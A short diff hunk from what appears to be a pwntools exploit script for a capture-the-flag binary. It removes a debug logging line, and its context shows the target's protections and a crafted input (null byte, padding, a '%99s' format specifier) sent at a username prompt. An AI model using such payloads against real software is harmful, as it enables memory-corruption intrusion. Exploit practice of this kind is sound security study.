@@ -37,7 +37,7 @@ continue
 # Stack:    No canary found
 # NX:       NX enabled
 # PIE:      No PIE (0x8048000)
-context.log_level = 'DEBUG'
+
 io = start()
 io.recvuntil(b"username:")
 io.sendline(b"hi\x00" + b"A"*17 + b"%99s")
